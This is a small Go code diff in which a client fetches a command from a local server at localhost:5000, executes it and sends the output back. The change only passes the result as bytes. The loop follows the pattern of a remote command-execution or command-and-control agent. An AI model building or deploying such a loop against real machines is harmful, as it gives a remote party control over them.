@@ -13,7 +13,7 @@ func main() {
 	url := "http://localhost:5000"
 	comando := s.RecvCmd(url + "/command")
 	resp := s.ExecCmd(comando)
-	respStatus := s.SendCmd(url+"/send", resp)
+	respStatus := s.SendCmd(url+"/send", resp.Bytes())
 
 	log.Println(respStatus)
 }
